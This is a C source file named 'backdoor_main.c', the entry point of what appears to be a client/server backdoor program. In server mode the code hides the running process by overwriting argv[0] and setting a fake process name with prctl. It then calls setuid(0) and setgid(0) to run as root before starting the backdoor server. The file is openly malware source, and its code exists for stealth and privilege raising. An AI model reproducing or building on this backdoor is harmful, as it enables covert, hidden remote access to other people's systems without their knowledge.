/*==============================================================================
|   SOURCE:     backdoor_main.c
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Program's main() function is defined within this source file.
==============================================================================*/
#include "../include/cmd_args.h"
#include "../include/client.h"
#include "../include/server.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

/*------------------------------------------------------------------------------
|   FUNCTION:   int main(int argc, char **argv)
|                   argc - number of command line arguments
|                   argv - array of command line arguments
|
|   RETURN:     0 on success
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Main entry point of program.
------------------------------------------------------------------------------*/
int main(int argc, char **argv)
{
    // Check for the number of args provided
    if(validate_initial_args(argc) == -1)
        exit(1);

    // Check if user specified args for client or server program
    int res = check_for_program_specifier(argv);
    if(res == CLIENT)
    {
        if(!valid_clt_args(argc))
            exit(1);

        Client_Args clt_args;
        extract_clt_args(argv, &clt_args);
        run_client(clt_args);
    }
    else if(res == SERVER)
    {
        if(!valid_srv_args(argc))
            exit(1);

        Server_Args srv_args;
        extract_srv_args(argv, &srv_args);

        // mask process
        memset(argv[0], 0, strlen(argv[0]));
        strcpy(argv[0], srv_args.mask);
        prctl(PR_SET_NAME, srv_args.mask);

        // raise privilages
        setuid(0);
        setgid(0);

        run_server(srv_args);                   
    }
    else
        exit(1);

    return 0;
}
